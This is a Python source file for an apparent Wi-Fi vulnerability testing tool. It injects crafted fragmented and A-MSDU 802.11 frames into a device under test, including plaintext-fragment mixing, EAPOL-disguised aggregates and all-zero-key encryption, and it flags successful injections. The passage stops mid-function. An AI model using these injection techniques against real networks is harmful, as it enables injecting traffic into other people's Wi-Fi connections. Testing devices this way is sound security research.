#!/usr/bin/env python3
from libwifi import *
import abc, sys, socket, struct, time, subprocess, atexit, select, copy
import argparse
from wpaspy import Ctrl
from scapy.contrib.wpa_eapol import WPA_key

from tests_qca import *

# Ath9k_htc dongle notes:
# - The ath9k_htc devices by default overwrite the injected sequence number.
#   However, this number is not incremented when the MoreFragments flag is set,
#   meaning we can inject fragmented frames (albeit with a different sequence
#   number than then one we use for injection this this script).
# - The above trick does not work when we want to inject other frames between
#   two fragmented frames (the chip will assign them difference sequence numbers).
#   Even when the fragments use a unique QoS TID, sending frames between them
#   will make the chip assign difference sequence numbers to both fragments.
# - Overwriting the sequence can be avoided by patching `ath_tgt_tx_seqno_normal`
#   and commenting out the two lines that modify `i_seq`.
# - See also the comment in Station.perform_actions to avoid other bugs with
#   ath9k_htc when injecting frames with the MF flag and while being in AP mode.
# - The at9k_htc dongle, and likely other Wi-Fi devices, will reorder frames with
#   different QoS priorities. This means injected frames with differen priorities
#   may get reordered by the driver/chip. We avoided this by modifying the ath9k_htc
#   driver to send all frames using the transmission queue of priority zero,
#   independent of the actual QoS priority value used in the frame.

#MAC_STA2 = "d0:7e:35:d9:80:91"
#MAC_STA2 = "20:16:b9:b2:73:7a"
MAC_STA2 = "80:5a:04:d4:54:c4"

# ----------------------------------- Utility Commands -----------------------------------

def wpaspy_clear_messages(ctrl):
	# Clear old replies and messages from the hostapd control interface. This is not
	# perfect and there may be new unrelated messages after executing this code.
	while ctrl.pending():
		ctrl.recv()

def wpaspy_command(ctrl, cmd):
	wpaspy_clear_messages(ctrl)
	rval = ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "wpa_supplicant did not recognize the command %s. Did you (re)compile wpa_supplicant?" % cmd.split()[0])
		quit(1)
	elif "FAIL" in rval:
		log(ERROR, f"Failed to execute command {cmd}")
		quit(1)
	return rval

def argv_pop_argument(argument):
	if not argument in sys.argv: return False
	idx = sys.argv.index(argument)
	del sys.argv[idx]
	return True

class TestOptions():
	def __init__(self):
		# Workaround for ath9k_htc bugs
		self.inject_workaround = False

		self.interface = None
		self.ip = None
		self.peerip = None

def log_level2switch():
	if global_log_level == 1: return ["-d", "-K"]
	elif global_log_level <= 0: return ["-dd", "-K"]
	return ["-K"]

#TODO: Move to libwifi?
def add_msdu_frag(src, dst, payload):
	length = len(payload)
	p = Ether(dst=dst, src=src, type=length)

	payload = raw(payload)

	total_length = len(p) + len(payload)
	padding = ""
	if total_length % 4 != 0:
		padding = b"\x00" * (4 - (total_length % 4))

	return p / payload / Raw(padding)

# ----------------------------------- Tests -----------------------------------

# XXX --- We should always first see how the DUT reactions to a normal packet.
#	  For example, Aruba only responded to DHCP after reconnecting, and
#	  ignored ICMP and ARP packets.
REQ_ARP, REQ_ICMP, REQ_DHCP = range(3)

def generate_request(sta, ptype, prior=2):
	header = sta.get_header(prior=prior)
	if ptype == REQ_ARP:
		# Avoid using sta.get_peermac() because the correct MAC addresses may not
		# always be known (due to difference between AP and router MAC addresses).
		check = lambda p: ARP in p and p.hwdst == sta.mac and p.pdst == sta.ip and p.psrc == sta.peerip
		request = LLC()/SNAP()/ARP(op=1, hwsrc=sta.mac, psrc=sta.ip, pdst=sta.peerip)

	elif ptype == REQ_ICMP:
		label = b"test_ping_icmp"
		check = lambda p: ICMP in p and label in raw(p)
		request = LLC()/SNAP()/IP(src=sta.ip, dst=sta.peerip)/ICMP()/Raw(label)

	elif ptype == REQ_DHCP:
		xid = random.randint(0, 2**31)
		check = lambda p: BOOTP in p and p[BOOTP].xid == xid

		rawmac = bytes.fromhex(sta.mac.replace(':', ''))
		request = LLC()/SNAP()/IP(src="0.0.0.0", dst="255.255.255.255")
		request = request/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=xid)
		request = request/DHCP(options=[("message-type", "discover"), "end"])

		# We assume DHCP discover is sent towards the AP.
		header.addr3 = "ff:ff:ff:ff:ff:ff"

	return header, request, check

class Action():
	# StartAuth: when starting the handshake
	# BeforeAuth: right before last message of the handshake
	# AfterAuth: right after last message of the handshake
	# Connected: 1 second after handshake completed (allows peer to install keys)
	StartAuth, BeforeAuth, AfterAuth, Connected = range(4)

	# GetIp: request an IP before continueing (or use existing one)
	# Rekey: force or wait for a PTK rekey
	# Reconnect: force a reconnect
	GetIp, Rekey, Reconnect, Roam, Inject, Func = range(6)

	def __init__(self, trigger, action=Inject, func=None, enc=False, frame=None, inc_pn=1, delay=None, wait=None, key=None):
		self.trigger = trigger
		self.action = action
		self.func = func

		if self.func != None:
			self.action = Action.Func

		# Take into account default wait values. A wait value of True means the next
		# Action will not be immediately executed if it has the same trigger (instead
		# we have to wait on a new trigger e.g. after rekey, reconnect, roam).
		self.wait = wait
		if self.wait == None:
			self.wait = action in [Action.Rekey, Action.Reconnect, Action.Roam]

		# Specific to fragment injection
		self.encrypted = enc
		self.inc_pn = inc_pn
		self.delay = delay
		self.frame = frame
		self.key = key

	def get_action(self):
		return self.action

	def __str__(self):
		trigger = ["StartAuth", "BeforeAuth", "AfterAuth", "Connected"][self.trigger]
		action = ["GetIp", "Rekey", "Reconnect", "Roam", "Inject", "Func"][self.action]
		return f"Action({trigger}, {action})"

	def __repr__(self):
		return str(self)

class Test(metaclass=abc.ABCMeta):
	"""
	Base class to define tests. The default defined methods can be used,
	but they can also be overriden if desired.
	"""

	def __init__(self, actions=None):
		self.actions = actions if actions != None else []
		self.generated = False
		self.delay = None
		self.inc_pn = None

	def next_trigger_is(self, trigger):
		if len(self.actions) == 0:
			return False
		return self.actions[0].trigger == trigger

	def next_action(self, station):
		if len(self.actions) == 0:
			return None

		if self.actions[0].action == Action.Inject and not self.generated:
			self.generate(station)
			self.generated = True

		act = self.actions[0]
		del self.actions[0]
		return act

	def get_actions(self, action):
		return [act for act in self.actions if act.action == action]

	@abc.abstractmethod
	def prepare(self, station):
		pass

	def generate(self, station):
		self.prepare(station)
		self.enforce_delay()
		self.enforce_inc_pn()

	@abc.abstractmethod
	def check(self, p):
		return False

	def set_options(self, delay=None, inc_pn=None):
		self.delay = delay
		self.inc_pn = inc_pn

	def enforce_delay(self):
		if self.delay == None or self.delay <= 0:
			return

		# Add a delay between injected fragments if requested
		for frag in self.get_actions(Action.Inject)[1:]:
			frag.delay = self.delay

	def enforce_inc_pn(self):
		if self.inc_pn == None:
			return

		# Add a delay between injected fragments if requested
		for frag in self.get_actions(Action.Inject)[1:]:
			frag.inc_pn = self.inc_pn

class PingTest(Test):
	def __init__(self, ptype, fragments, bcast=False, separate_with=None, as_msdu=False):
		super().__init__(fragments)
		self.ptype = ptype
		self.bcast = bcast
		self.separate_with = separate_with
		self.check_fn = None
		self.as_msdu = as_msdu

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def prepare(self, station):
		log(STATUS, "Generating ping test", color="green")

		# Generate the header and payload
		header, request, self.check_fn = generate_request(station, self.ptype)

		if self.as_msdu:
			# Set the A-MSDU frame type flag in the QoS header
			header.Reserved = 1
			# Encapsulate the request in an A-MSDU payload
			request = add_msdu_frag(station.mac, station.get_peermac(), request)

		# Generate all the individual (fragmented) frames
		num_frags = len(self.get_actions(Action.Inject))
		frames = create_fragments(header, request, num_frags)

		# Assign frames to the existing fragment objects
		for frag, frame in zip(self.get_actions(Action.Inject), frames):
			if self.bcast:
				frame.addr1 = "ff:ff:ff:ff:ff:ff"
			frag.frame = frame

		# Put the separator after each fragment if requested.
		if self.separate_with != None:
			for i in range(len(self.actions) - 1, 0, -1):
				# Check if the previous action is indeed an injection
				prev_frag = self.actions[i - 1]
				if prev_frag.action != Action.Inject:
					continue

				# Create a similar inject action for the seperator
				sep_frag = Action(prev_frag.trigger, enc=prev_frag.encrypted)
				sep_frag.frame = self.separate_with.copy()
				station.set_header(sep_frag.frame)

				self.actions.insert(i, sep_frag)

class LinuxTest(Test):
	def __init__(self, ptype):
		super().__init__([
			Action(Action.Connected, enc=True),
			Action(Action.Connected, enc=True),
			Action(Action.Connected, enc=False)
		])
		self.ptype = ptype
		self.check_fn = None

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def prepare(self, station):
		header, request, self.check_fn = generate_request(station, self.ptype)
		frag1, frag2 = create_fragments(header, request, 2)

		# Fragment 1: normal
		self.actions[0].frame = frag1

		# Fragment 2: make Linux update latest used crypto Packet Number.
		# We only change the sequence number since that is not authenticated.
		frag2enc = frag2.copy()
		frag2enc.SC ^= (1 << 4)
		self.actions[1].frame = frag2enc

		# Fragment 3: can now inject last fragment as plaintext
		self.actions[2].frame = frag2

class MacOsTest(Test):
	"""
	See docs/macoxs-reversing.md for background on the attack.
	"""
	def __init__(self, ptype, actions):
		super().__init__(actions)
		self.ptype = ptype
		self.check_fn = None

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def prepare(self, station):
		# First fragment is the start of an EAPOL frame
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, _ = create_fragments(header, data=request, num_frags=2)

		# Second fragment has same sequence number. Will be accepted
		# before authenticated because previous fragment was EAPOL.
		# By sending to broadcast, this fragment will not be reassembled
		# though, meaning it will be treated as a full frame (and not EAPOL).
		_, request, self.check_fn = generate_request(station, self.ptype)
		frag2, = create_fragments(header, data=request, num_frags=1)
		frag2.SC |= 1
		frag2.addr1 = "ff:ff:ff:ff:ff:ff"

		self.actions[0].frame = frag1
		self.actions[1].frame = frag2

class EapolTest(Test):
	# TODO:
	# Test 1: plain unicast EAPOL fragment, plaintext broadcast frame => trivial frame injection
	# Test 2: plain unicast EAPOL fragment, encrypted broadcast frame => just an extra test
	# Test 3: plain unicast EAPOL fragment, encrypted unicast fragment => demonstrates mixing of plain/encrypted fragments
	# Test 4: EAPOL and A-MSDU tests?
	def __init__(self):
		super().__init__([
			Action(Action.BeforeAuth, enc=False),
			Action(Action.BeforeAuth, enc=False)
		])

	def prepare(self, station):
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, frag2 = create_fragments(header, data=request, num_frags=2)

		frag1copy, frag2copy = create_fragments(header, data=request, num_frags=2)
		frag1copy.addr1 = "ff:ff:ff:ff:ff:ff"
		frag2copy.addr1 = "ff:ff:ff:ff:ff:ff"

		self.actions[0].frame = frag1
		self.actions[0].frame = frag2


class EapolMsduTest(Test):
	def __init__(self, ptype, actions):
		super().__init__(actions)
		self.ptype = ptype
		self.check_fn = None

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def prepare(self, station):
		log(STATUS, "Generating ping test", color="green")

		# Generate the single frame
		header, request, self.check_fn = generate_request(station, self.ptype)
		# Set the A-MSDU frame type flag in the QoS header
		header.Reserved = 1
		# Testing
		#header.addr2 = "00:11:22:33:44:55"

		# Masquerade A-MSDU frame as an EAPOL frame
		request = LLC()/SNAP()/EAPOL()/Raw(b"\x00\x06AAAAAA") / add_msdu_frag(station.mac, station.get_peermac(), request)

		frames = create_fragments(header, request, 1)

		# XXX Where was this needed again?
		auth = Dot11()/Dot11Auth(status=0, seqnum=1)
		station.set_header(auth)
		auth.addr2 = "00:11:22:33:44:55"

		self.actions[0].frame = auth
		self.actions[1].frame = frames[0]


# ----------------------------------- Abstract Station Class -----------------------------------

class Station():
	def __init__(self, daemon, mac, ds_status):
		self.daemon = daemon
		self.options = daemon.options
		self.test = daemon.options.test
		self.txed_before_auth = False
		self.txed_before_auth_done = False
		self.obtained_ip = False
		self.waiting_on_ip = False

		# Don't reset PN to have consistency over rekeys and reconnects
		self.reset_keys()
		self.pn = 0x100

		# Contains either the "to-DS" or "from-DS" flag.
		self.FCfield = Dot11(FCfield=ds_status).FCfield
		self.seqnum = 1

		# MAC address and IP of the station that our script controls.
		# Can be either an AP or client.
		self.mac = mac
		self.ip = None

		# MAC address of the BSS. This is always the AP.
		self.bss = None

		# MAC address and IP of the peer station.
		# Can be either an AP or client.
		self.peermac = None
		self.peerip = None

		# To test frame forwarding to a 3rd party
		self.othermac = None
		self.otherip = None

		# To trigger Connected event 1-2 seconds after Authentication
		self.time_connected = None

	def reset_keys(self):
		self.tk = None
		self.gtk = None
		self.gtk_idx = None

	def handle_mon(self, p):
		pass

	def handle_eth(self, p):
		repr(repr(p))

		if self.test != None and self.test.check != None and self.test.check(p):
			log(STATUS, "SUCCESSFULL INJECTION", color="green")
			log(STATUS, "Received packet: " + repr(p))
			self.test = None

	def send_mon(self, data, prior=1):
		"""
		Right after completing the handshake, it occurred several times that our
		script was sending data *before* the key had been installed (or the port
		authorized). This meant traffic was dropped. Use this function to manually
		send frames over the monitor interface to ensure delivery and encryption.
		"""

		# If it contains an Ethernet header, strip it, and take addresses from that
		p = self.get_header(prior=prior)
		if Ether in data:
			payload = data.payload
			p.addr2 = data.src

			# This tests if to-DS is set
			if p.FCfield & 1:
				p.addr3 = data.dst
			else:
				p.addr1 = data.dst

		else:
			payload = data

		p = p/LLC()/SNAP()/payload
		if self.tk: p = self.encrypt(p)

		log(STATUS, "[Injecting] " + repr(p))
		daemon.inject_mon(p)

	def set_header(self, p, forward=False, prior=None):
		"""Set addresses to send frame to the peer or the 3rd party station."""
		# Forward request only makes sense towards the DS/AP
		assert (not forward) or ((p.FCfield & 1) == 0)
		# Priority is only supported in data frames
		assert (prior == None) or (p.type == 2)

		# Set the appropriate to-DS or from-DS bits
		p.FCfield |= self.FCfield

		# Add the QoS header if requested
		if prior != None:
			p.subtype = 8
			if not Dot11QoS in p:
				p.add_payload(Dot11QoS(TID=prior))
			else:
				p[Dot11QoS].TID = prior

		# This checks if the to-DS is set (frame towards the AP)
		if p.FCfield & 1 != 0:
			p.addr1 = self.bss
			p.addr2 = self.mac
			p.addr3 = self.get_peermac() if not forward else self.othermac
		else:
			p.addr1 = self.peermac
			p.addr2 = self.mac
			p.addr3 = self.bss

	def get_header(self, seqnum=None, prior=2, **kwargs):
		"""
		Generate a default common header. By default use priority of 1 so destination
		will still accept lower Packet Numbers on other priorities.
		"""

		if seqnum == None:
			seqnum = self.seqnum
			self.seqnum += 1

		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_header(header, prior=prior, **kwargs)
		return header

	def encrypt(self, frame, inc_pn=1, force_key=None):
		self.pn += inc_pn
		key, keyid = (self.tk, 0) if int(frame.addr1[1], 16) & 1 == 0 else (self.gtk, self.gtk_idx)
		if force_key == 0:
			log(STATUS, "Encrypting with all-zero key")
			key = b"\x00" * len(key)

		if len(key) == 16:
			encrypted = encrypt_ccmp(frame, key, self.pn, keyid)
		else:
			encrypted = encrypt_wep(frame, key, self.pn, keyid)

		return encrypted

	def handle_connecting(self, bss):
		log(STATUS, f"Station: setting BSS MAC address {bss}")
		self.bss = bss

		# Clear the keys on a new connection
		self.reset_keys()

	def set_peermac(self, peermac):
		self.peermac = peermac

	def get_peermac(self):
		# When being a client, the peermac may not yet be known. In that
		# case we assume it's the same as the BSS (= AP) MAC address.
		if self.peermac == None:
			return self.bss
		return self.peermac

	def trigger_eapol_events(self, eapol):
		# Ignore EAP authentication handshakes
		if EAP in eapol: return None

		# Track return value of possible trigger Action function
		result = None

		key_type   = eapol.key_info & 0x0008
		key_ack    = eapol.key_info & 0x0080
		key_mic    = eapol.key_info & 0x0100
		key_secure = eapol.key_info & 0x0200
		# Detect Msg3/4 assumig WPA2 is used --- XXX support WPA1 as well
		is_msg3_or_4 = key_secure != 0

		# Inject any fragments before authenticating
		if not self.txed_before_auth:
			log(STATUS, "Action.StartAuth", color="green")
			result = self.perform_actions(Action.StartAuth, eapol=eapol)
			self.txed_before_auth = True
			self.txed_before_auth_done = False

		# Inject any fragments when almost done authenticating
		elif is_msg3_or_4 and not self.txed_before_auth_done:
			log(STATUS, "Action.BeforeAuth", color="green")
			result = self.perform_actions(Action.BeforeAuth, eapol=eapol)
			self.txed_before_auth_done = True
			self.txed_before_auth = False

		self.time_connected = None
		return result

	def handle_eapol_tx(self, eapol):
		eapol = EAPOL(eapol)
		send_it = self.trigger_eapol_events(eapol)

		if send_it == None:
			# - Send over monitor interface to assure order compared to injected fragments.
			# - This is also important because the station might have already installed the
			#   key before this script can send the EAPOL frame over Ethernet (but we didn't
			#   yet request the key from this script).
			# - Send with high priority, otherwise Action.AfterAuth might be send before
			#   the EAPOL frame by the Wi-Fi chip.
			self.send_mon(eapol)

	def perform_actions(self, trigger, **kwargs):
		result = None
		if self.test == None:
			return

		frame = None
		while self.test.next_trigger_is(trigger):
			act = self.test.next_action(self)

			# TODO: Previously scheduled Connected on AfterAuth should be cancelled??
			if act.action == Action.GetIp and not self.obtained_ip:
				self.waiting_on_ip = True
				self.daemon.get_ip(self)
				break

			elif act.action == Action.Func:
				result = act.func(self, **kwargs)
				log(STATUS, "[Executed Function] Result=" + str(result))
				# TODO: How to collect multiple results on one trigger?

			elif act.action == Action.Rekey:
				# Force rekey as AP, wait on rekey as client
				self.daemon.rekey(self)

			elif act.action == Action.Roam:
				# Roam as client, TODO XXX what was AP?
				self.daemon.roam(self)

			elif act.action == Action.Reconnect:
				# Full reconnect as AP, reassociation as client
				self.daemon.reconnect(self)

			elif act.action == Action.Inject:
				if act.delay != None and act.delay > 0:
					log(STATUS, f"Sleeping {act.delay} seconds")
					time.sleep(act.delay)

				if act.encrypted:
					assert self.tk != None and self.gtk != None
					log(STATUS, "Encrypting with key " + self.tk.hex() + " " + repr(frame))
					frame = self.encrypt(act.frame, inc_pn=act.inc_pn, force_key=act.key)
				else:
					frame = act.frame

				self.daemon.inject_mon(frame)
				log(STATUS, "[Injected fragment] " + repr(frame))

			# Stop processing actions if requested
			if act.wait: break

		# With ath9k_htc devices, there's a bug when injecting a frame with the
		# More Fragments (MF) field *and* operating the interface in AP mode
		# while the target is connected. For some reason, after injecting the
		# frame, it halts the transmission of all other normal frames (this even
		# includes beacons). Injecting a dummy packet like below avoid this,
		# and assures packets keep being sent normally (when the last fragment
		# had the MF flag set).
		#
		# Note: when the device is only operating in monitor mode, this does
		#	not seem to be a problem.
		#
		if self.options.inject_workaround and frame != None and frame.FCfield & 0x4 != 0:
			self.daemon.inject_mon(Dot11(addr1="ff:ff:ff:ff:ff:ff"))
			log(STATUS, "[Injected packet] Prevented ath9k_htc bug after fragment injection")

		return result

	def update_keys(self):
		log(STATUS, "Requesting keys from wpa_supplicant")
		self.tk = self.daemon.get_tk(self)
		self.gtk, self.gtk_idx = self.daemon.get_gtk()

	def handle_authenticated(self):
		"""Called after completion of the 4-way handshake or similar"""
		self.update_keys()

		# Note that self.time_connect may get changed in perform_actions
		log(STATUS, "Action.AfterAuth", color="green")
		self.time_connected = time.time() + 1
		self.perform_actions(Action.AfterAuth)

	def handle_connected(self):
		"""This is called ~1 second after completing the handshake"""
		log(STATUS, "Action.Connected", color="green")
		self.perform_actions(Action.Connected)

	def set_ip_addresses(self, ip, peerip):
		self.ip = ip
		self.peerip = peerip
		self.obtained_ip = True

		if self.waiting_on_ip:
			self.waiting_on_ip = False
			self.perform_actions(Action.Connected)

	def time_tick(self):
		if self.time_connected != None and time.time() > self.time_connected:
			self.time_connected = None
			self.handle_connected()

# ----------------------------------- Client and AP Daemons -----------------------------------

class Daemon(metaclass=abc.ABCMeta):
	def __init__(self, options):
		self.options = options

		# Note: some kernels don't support interface names of 15+ characters
		self.nic_iface = options.interface
		self.nic_mon = "mon" + self.nic_iface[:12]

		self.process = None
		self.sock_eth = None
		self.sock_mon = None

	@abc.abstractmethod
	def start_daemon(self):
		pass

	def configure_daemon(self):
		pass

	def handle_mon(self, p):
		pass

	def handle_eth(self, p):
		pass

	@abc.abstractmethod
	def time_tick(self, station):
		pass

	@abc.abstractmethod
	def get_tk(self, station):
		pass

	def get_gtk(self):
		gtk, idx = wpaspy_command(self.wpaspy_ctrl, "GET_GTK").split()
		return bytes.fromhex(gtk), int(idx)

	@abc.abstractmethod
	def get_ip(self, station):
		pass

	@abc.abstractmethod
	def rekey(self, station):
		pass

	@abc.abstractmethod
	def reconnect(self, station):
		pass

	# TODO: Might be good to put this into libwifi?
	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Only create a new monitor interface if it does not yet exist
		try:
			scapy.arch.get_if_index(self.nic_mon)
		except IOError:
			subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
			subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])

		# 2. Configure monitor mode on interfaces
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

		# 3. Remember whether to need to perform a workaround.
		driver = get_device_driver(self.nic_iface)
		if driver == None:
			log(WARNING, "Unable to detect driver of interface!")
			log(WARNING, "Injecting fragments may contains bugs.")
		elif driver == "ath9k_htc":
			options.inject_workaround = True
			log(STATUS, "Detect ath9k_htc, using injection bug workarounds")

	def inject_mon(self, p):
		self.sock_mon.send(p)

	def inject_eth(self, p):
		self.sock_eth.send(p)

	def run(self):
		self.configure_interfaces()
		self.start_daemon()
		self.sock_mon = MonitorSocket(type=ETH_P_ALL, iface=self.nic_mon)
		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface)

		# Open the wpa_supplicant or hostapd control interface
		try:
			self.wpaspy_ctrl = Ctrl("wpaspy_ctrl/" + self.nic_iface)
			self.wpaspy_ctrl.attach()
		except:
			log(ERROR, "It seems wpa_supplicant/hostapd did not start properly, please inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise it won't start properly.")
			raise

		# Post-startup configuration of the supplicant or AP
		self.configure_daemon()

		# Monitor the virtual monitor interface of the client and perform the needed actions
		while True:
			sel = select.select([self.sock_mon, self.sock_eth, self.wpaspy_ctrl.s], [], [], 0.5)
			if self.sock_mon in sel[0]:
				p = self.sock_mon.recv()
				if p != None: self.handle_mon(p)

			if self.sock_eth in sel[0]:
				p = self.sock_eth.recv()
				if p != None and Ether in p: self.handle_eth(p)

			if self.wpaspy_ctrl.s in sel[0]:
				msg = self.wpaspy_ctrl.recv()
				self.handle_wpaspy(msg)

			self.time_tick()

	def stop(self):
		log(STATUS, "Closing Hostap daemon and cleaning up ...")
		if self.process:
			self.process.terminate()
			self.process.wait()
		if self.sock_eth: self.sock_eth.close()
		if self.sock_mon: self.sock_mon.close()


class Authenticator(Daemon):
	def __init__(self, options):
		super().__init__(options)

		self.apmac = None
		self.sock_eth = None
		self.dhcp = None
		self.arp_sender_ip = None
		self.arp_sock = None
		self.stations = dict()

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET_TK " + station.get_peermac())
		return bytes.fromhex(tk)

	def time_tick(self):
		for station in self.stations.values():
			station.time_tick()

	def get_ip(self, station):
		log(STATUS, f"Waiting on client {station.get_peermac()} to get IP")

	def rekey(self, station):
		log(STATUS, f"Starting PTK rekey with client {station.get_peermac()}", color="green")
		wpaspy_command(self.wpaspy_ctrl, "REKEY_PTK " + station.get_peermac())

	def reconnect(self, station):
		# Confirmed to *instantly* reconnect: Arch Linux, Windows 10 with Intel WiFi chip, iPad Pro 13.3.1
		# Reconnects only after a few seconds: MacOS (same with other reasons and with deauthentication)
		cmd = f"DISASSOCIATE {station.get_peermac()} reason={WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA}"
		wpaspy_command(self.wpaspy_ctrl, cmd)

	def handle_eth_dhcp(self, p, station):
		if not DHCP in p or not station.get_peermac() in self.dhcp.leases: return

		# This assures we only mark it was connected after receiving a DHCP Request
		req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
		if req_type != 3: return

		peerip = self.dhcp.leases[station.get_peermac()]
		log(STATUS, f"Client {station.get_peermac()} with IP {peerip} has connected")
		station.set_ip_addresses(self.arp_sender_ip, peerip)

	def handle_eth(self, p):
		# Ignore clients not connected to the AP
		clientmac = p[Ether].src
		if not clientmac in self.stations:
			return

		# Let clients get IP addresses
		self.dhcp.reply(p)
		self.arp_sock.reply(p)

		# Monitor DHCP messages to know when a client received an IP address
		station = self.stations[clientmac]
		if not station.obtained_ip:
			self.handle_eth_dhcp(p, station)
		else:
			station.handle_eth(p)

	def add_station(self, clientmac):
		if not clientmac in self.stations:
			station = Station(self, self.apmac, "from-DS")
			self.stations[clientmac] = station

			if self.options.ip and self.options.peerip:
				# XXX should we also override our own IP? Won't match with DHCP router.
				self.dhcp.prealloc_ip(clientmac, self.options.peerip)
				station.set_ip_addresses(self.options.ip, self.options.peerip)

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "AP-STA-CONNECTING" in msg:
			cmd, clientmac = msg.split()
			self.add_station(clientmac)

			log(STATUS, f"Client {clientmac} is connecting")
			station = self.stations[clientmac]
			station.handle_connecting(self.apmac)
			station.set_peermac(clientmac)

		elif "EAPOL-TX" in msg:
			cmd, clientmac, payload = msg.split()
			if not clientmac in self.stations:
				log(WARNING, f"Sending EAPOL to unknown client {clientmac}.")
				return
			self.stations[clientmac].handle_eapol_tx(bytes.fromhex(payload))

		# XXX WPA1: Take into account group key handshake on initial 4-way HS
		elif "AP-STA-CONNECTED" in msg:
			cmd, clientmac = msg.split()
			if not clientmac in self.stations:
				log(WARNING, f"Unknown client {clientmac} finished authenticating.")
				return
			self.stations[clientmac].handle_authenticated()

	def start_daemon(self):
		log(STATUS, "Starting hostapd ...")
		try:
			self.process = subprocess.Popen([
				"../hostapd/hostapd",
				"-i", self.nic_iface,
				"hostapd.conf"] + log_level2switch())
			time.sleep(1)
		except:
			if not os.path.exists("../hostapd/hostapd"):
				log(ERROR, "hostapd executable not found. Did you compile hostapd?")
			raise

		self.apmac = scapy.arch.get_if_hwaddr(self.nic_iface)

	def configure_daemon(self):
		# Intercept EAPOL packets that the AP wants to send
		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")

		# Let scapy handle DHCP requests
		self.dhcp = DHCP_sock(sock=self.sock_eth,
						domain='mathyvanhoef.com',
						pool=Net('192.168.100.0/24'),
						network='192.168.100.0/24',
						gw='192.168.100.254',
						renewal_time=600, lease_time=3600)
		# Configure gateway IP: reply to ARP and ping requests
		subprocess.check_output(["ifconfig", self.nic_iface, "192.168.100.254"])

		# Use a dedicated IP address for our ARP ping and replies
		self.arp_sender_ip = self.dhcp.pool.pop()
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.arp_sender_ip, ARP_addr=self.apmac)
		log(STATUS, f"Will inject ARP packets using sender IP {self.arp_sender_ip}")


class Supplicant(Daemon):
	def __init__(self, options):
		super().__init__(options)
		self.station = None
		self.arp_sock = None
		self.dhcp_xid = None
		self.dhcp_offer_frame = False
		self.time_retrans_dhcp = None

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET tk")
		if tk == "none":
			raise Exception("Couldn't retrieve session key of client")
		else:
			return bytes.fromhex(tk)

	def get_ip(self, station):
		if not self.dhcp_offer_frame:
			self.send_dhcp_discover()
		else:
			self.send_dhcp_request(self.dhcp_offer_frame)

		self.time_retrans_dhcp = time.time() + 2.5

	def rekey(self, station):
		# WAG320N: does not work (Broadcom - no reply)
		# MediaTek: starts handshake. But must send Msg2/4 in plaintext! Request optionally in plaintext.
		#	Maybe it's removing the current PTK before a rekey?
		# RT-N10: we get a deauthentication as a reply. Connection is killed.
		# LANCOM: does not work (no reply)
		# Aruba: does not work (no reply)
		# ==> Only reliable way is to configure AP to constantly rekey the PTK, and wait
		#     untill the AP starts a rekey.
		#wpaspy_command(self.wpaspy_ctrl, "KEY_REQUEST 0 1")

		log(STATUS, "Client cannot force rekey. Waiting on AP to start PTK rekey.", color="orange")

	def time_tick(self):
		if self.time_retrans_dhcp != None and time.time() > self.time_retrans_dhcp:
			log(WARNING, "Retransmitting DHCP message", color="orange")
			self.get_ip(self)

		self.station.time_tick()

	def send_dhcp_discover(self):
		if self.dhcp_xid == None:
			self.dhcp_xid = random.randint(0, 2**31)

		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
		req = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
		req = req/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=self.dhcp_xid)
		req = req/DHCP(options=[("message-type", "discover"), "end"])

		log(STATUS, f"Sending DHCP discover with XID {self.dhcp_xid}")
		self.station.send_mon(req)

	def send_dhcp_request(self, offer):
		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
		myip = offer[BOOTP].yiaddr
		sip = offer[BOOTP].siaddr
		xid = offer[BOOTP].xid

		reply = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
		reply = reply/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=self.dhcp_xid)
		reply = reply/DHCP(options=[("message-type", "request"), ("requested_addr", myip),
					    ("hostname", "fragclient"), "end"])

		log(STATUS, f"Sending DHCP request with XID {self.dhcp_xid}")
		self.station.send_mon(reply)

	def handle_eth_dhcp(self, p):
		"""Handle packets needed to connect and request an IP"""
		if not DHCP in p: return

		req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')

		# DHCP Offer
		if req_type == 2:
